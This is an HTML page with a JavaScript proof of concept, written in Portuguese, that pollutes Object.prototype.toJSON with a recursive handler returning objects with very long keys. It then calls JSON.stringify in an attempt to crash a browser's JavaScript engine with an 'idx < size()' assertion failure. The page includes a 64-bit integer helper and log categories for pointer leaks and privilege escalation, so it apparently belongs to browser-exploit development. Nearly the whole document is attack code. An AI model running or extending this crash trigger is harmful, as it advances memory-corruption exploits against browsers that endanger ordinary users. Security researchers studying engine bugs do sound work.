<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Isolado v2.3t - Chaves Longas na Recursão</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output {
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            height: 80vh;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 10px;
        }
        .log-info { color: #6cf; } 
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } 
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } 
        .log-vuln { color: #ff4444; font-weight: bold; } 
        .log-good { color: #4CAF50; } 
        .log-warn { color: #FFC107; } 
        .log-error { color: #f44336; } 
        .log-critical { color: #f0f; font-weight: bold; } 
        .log-leak { color: #FF9800; font-weight: bold; } 
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>PoC Isolado v2.3t - Chaves Longas na Recursão</h1>
    <p>Tenta acionar o crash idx < size() com chaves longas e limite de recursão moderado. FOCO NO CONSOLE.</p>
    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste v2.3t (Chaves Longas)</button>
    <div id="output"></div>

    <script>
        // --- Utilitários ---
        class AdvancedInt64 { 
            constructor(low, high) {
                let buffer = new Uint32Array(2);
                let bytes = new Uint8Array(buffer.buffer);
                if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); }
                if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); }
                let is_one = false;
                if (arguments.length === 1) { is_one = true; }
                if (!is_one) {
                    if (typeof (low) !== 'number' && typeof (high) !== 'number') {
                        throw TypeError('low/high must be numbers');
                    }
                }
                const check_range = (x) => (-0x80000000 <= x) && (x <= 0xffffffff);
                if (typeof low === 'number') {
                    if (!check_range(low)) { throw TypeError('low not a valid value: ' + low); }
                    if (is_one) {
                        high = 0;
                        if (low < 0) { high = -1; }
                    } else {
                        if (!check_range(high)) { throw TypeError('high not a valid value: ' + high); }
                    }
                    buffer[0] = low;
                    buffer[1] = high;
                } else if (typeof low === 'string') {
                    let hexstr = low;
                    if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); }
                    if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; }
                    if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); }
                    else { hexstr = hexstr.padStart(16, '0');}
                    for (let i = 0; i < 8; i++) {
                        bytes[i] = parseInt(hexstr.slice(14 - i*2, 16 - i*2), 16);
                    }
                } else if (typeof low === 'object') {
                    if (low instanceof AdvancedInt64) {
                        bytes.set(low.bytes);
                    } else if (low.length === 8) {
                        bytes.set(low);
                    } else { throw TypeError("Array must have exactly 8 elements."); }
                } else {
                    throw TypeError('AdvancedInt64 does not support your object for conversion');
                }
                this.buffer = buffer;
                this.bytes = bytes;
            }
            low() { return this.buffer[0]; }
            high() { return this.buffer[1]; }
            toString(is_pretty) {
                let lowStr = this.low().toString(16).padStart(8, '0');
                let highStr = this.high().toString(16).padStart(8, '0');
                if (is_pretty) {
                    highStr = highStr.substring(0, 4) + '_' + highStr.substring(4);
                    lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4);
                    return '0x' + highStr + '_' + lowStr;
                }
                return '0x' + highStr + lowStr;
            }
        }

        const generalUtils = {
            logToDiv: (divId, message, type = 'info', funcName = '') => {
                const outputDiv = document.getElementById(divId);
                if (!outputDiv) {
                    console.error(`[${funcName}] ERRO FATAL: Div de log '${divId}' não encontrada.`);
                    return;
                }
                try {
                    const timestamp = `[${new Date().toLocaleTimeString()}]`;
                    const prefix = funcName ? `[${funcName}] ` : '';
                    const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                    const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
                    if(outputDiv.innerHTML.length > 300000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 150000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
                    outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                } catch(e) { console.error(`Erro DENTRO de generalUtils.logToDiv:`, e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR INTERNO] ${String(e)}\n`; }
            }
        };
        // --- Fim Utilitários ---

        const outputDivS1 = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');    
        const MEDIUM_PAUSE_S1 = 200;

        const logS1 = (message, type = 'info', funcName = '') => {
            console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
            generalUtils.logToDiv('output', message, type, funcName);
        };

        const PAUSE_S1_FUNC = (ms = 10) => new Promise(r => setTimeout(r, ms));
        
        const testObject_t_long = { p1_t: "val_t1", p2_t: "val_t2" }; // Objeto raiz simples
        let callCount_toJSON_t_long = 0;
        let originalToJSON_Descriptor_t_long;
        const ppKey_t_long = 'toJSON';

        // --- Configurações para Chaves Longas ---
        const LONG_KEY_LENGTH = 4000; // Experimente com 1000, 2000, 4000, 8000 etc.
        const RECURSIVE_KEY_STRING_BASE_LONG = "X".repeat(LONG_KEY_LENGTH) + "_KEY_"; 
        const MAX_toJSON_CALLS_t_long = 50; // Limite de recursão moderado

        function setupPrototypePollution_t_long() {
            callCount_toJSON_t_long = 0;
            originalToJSON_Descriptor_t_long = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_t_long);

            Object.prototype[ppKey_t_long] = function() { 
                callCount_toJSON_t_long++;
                let logPrefix = `toJSON PoC v2.3t-Long (Call ${callCount_toJSON_t_long})`;
                
                let thisIdentifier = "unknown_this_t_long";
                if (this === testObject_t_long) thisIdentifier = "ROOT_T_LONG";
                else if (Array.isArray(this)) thisIdentifier = "ARRAY_T_LONG";
                else if (this && typeof this === 'object' && this.hasOwnProperty('level_t_long')) thisIdentifier = `PREV_RETURN_OBJ_L${this.level_t_long}_T_LONG`;

                console.log(`%c${logPrefix} - INVOKED! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "background: #1e1e1e; color: #00ffff");
                
                if (callCount_toJSON_t_long > MAX_toJSON_CALLS_t_long) { 
                    console.warn(`${logPrefix} - Limite de chamadas toJSON (${MAX_toJSON_CALLS_t_long}) atingido com chaves longas. Retornando string.`);
                    logS1(`${logPrefix} - Limite de chamadas toJSON (${MAX_toJSON_CALLS_t_long}) atingido. Retornando string.`, 'warn', 'toJSON_t_long');
                    return `recursion_limit_long_${callCount_toJSON_t_long}`;
                }

                let keys = [];
                try {
                    console.log(`%c${logPrefix} - PRESTES a chamar Object.keys(this) para id='${thisIdentifier}'`, "color:red; font-weight:bold;");
                    keys = Object.keys(this); 
                    console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para id='${thisIdentifier}'. Keys Original:`, "color:green", keys);
                    
                    let keysToUseInReturn;
                    if (thisIdentifier === "ROOT_T_LONG") {
                        keysToUseInReturn = keys; 
                    } else {
                        // Gera chaves LONGAS para níveis recursivos
                        keysToUseInReturn = keys.map((key, index) => `${RECURSIVE_KEY_STRING_BASE_LONG}${callCount_toJSON_t_long}_${index}`);
                        console.log(`%c${logPrefix} - Geradas CHAVES LONGAS para retorno (id='${thisIdentifier}'): [${keysToUseInReturn[0] ? keysToUseInReturn[0].substring(0,20) + "..." : ""}, ...] (Total: ${keysToUseInReturn.length})`, "color:orange");
                    }
                    
                    logS1(`${logPrefix} - Usando ${keysToUseInReturn.length} chaves no retorno (primeira amostra: ${keysToUseInReturn[0] ? keysToUseInReturn[0].substring(0,30)+"..." : "N/A"}).`, 'good', 'toJSON_t_long');
                    return { 
                        level_t_long: callCount_toJSON_t_long, 
                        payload_r_keys_long: keysToUseInReturn 
                    };

                } catch (e) {
                    console.error(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}':`, e);
                    logS1(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_t_long');
                    return { "error_in_toJSON_t_long": true, "message": String(e.message) };
                }
            };
            logS1(`Poluição Object.prototype.toJSON APLICADA (v2.3t-Long - Chaves Longas, Limite: ${MAX_toJSON_CALLS_t_long}).`, 'good', 'setup_t_long');
        }

        function cleanupPrototypePollution_t_long() {
            if (originalToJSON_Descriptor_t_long) {
                Object.defineProperty(Object.prototype, ppKey_t_long, originalToJSON_Descriptor_t_long);
            } else if (Object.prototype.hasOwnProperty(ppKey_t_long)) {
                delete Object.prototype[ppKey_t_long];
            }
            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_t_long');
        }

        async function runIsolatedTest() {
            document.querySelectorAll('button').forEach(b => b.disabled = true);
            if (outputDivS1) outputDivS1.innerHTML = '';
            logS1(`==== INICIANDO PoC Isolado v2.3t (Chaves Longas, Limite ${MAX_toJSON_CALLS_t_long} - CRASH idx < size() ESPERADO?) ====`, 'test', 'runTest_t_long');

            setupPrototypePollution_t_long();
            
            logS1(`Tentando JSON.stringify em testObject_t_long...`, 'critical', 'runTest_t_long');
            let result_t_long;
            let errorState_t_long = null;
            try {
                result_t_long = JSON.stringify(testObject_t_long); 
                logS1(`JSON.stringify CONCLUÍDO (INESPERADO SE O CRASH DEVERIA OCORRER!). Resultado: ${result_t_long ? String(result_t_long).substring(0, 300) : "N/A"}`, 'warn', 'runTest_t_long');
            } catch (e) {
                errorState_t_long = e;
                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_t_long');
                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_t_long');
                console.error("ERRO durante JSON.stringify em runTest_t_long:", e);
            } finally {
                logS1("Entrou no finally de runTest_t_long.", 'info', 'runTest_t_long');
                cleanupPrototypePollution_t_long();
            }
            
            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
            if (errorState_t_long && errorState_t_long.toString().includes("Maximum call stack size exceeded")) {
                 logS1(`\n==== PoC Isolado v2.3t (Chaves Longas) CONCLUÍDO com ESTOURO DE PILHA (Chamadas toJSON: ${callCount_toJSON_t_long}) ====`, 'error', 'runTest_t_long');
            } else if (!result_t_long && !errorState_t_long) { // Se não há resultado nem erro capturado, provavelmente travou antes
                 logS1(`\n==== PoC Isolado v2.3t (Chaves Longas) CONCLUÍDO mas PODE TER TRAVADO SEM ERRO CAPTURÁVEL (Chamadas toJSON: ${callCount_toJSON_t_long}) ====`, 'warn', 'runTest_t_long');
                 logS1("VERIFIQUE O CONSOLE POR CRASHES DO MOTOR JS (ex: idx < size).", 'critical', 'runTest_t_long');
            } else if (errorState_t_long) { // Outro tipo de erro
                logS1(`\n==== PoC Isolado v2.3t (Chaves Longas) CONCLUÍDO COM ERRO (Chamadas toJSON: ${callCount_toJSON_t_long}) ====`, 'error', 'runTest_t_long');
            } else { // Concluído sem erro capturável e com resultado
                 logS1(`\n==== PoC Isolado v2.3t (Chaves Longas) CONCLUÍDO (Chamadas toJSON: ${callCount_toJSON_t_long}) ====`, 'test', 'runTest_t_long');
            }
            document.querySelectorAll('button').forEach(b => b.disabled = false);
        }
    </script>
</body>
</html>
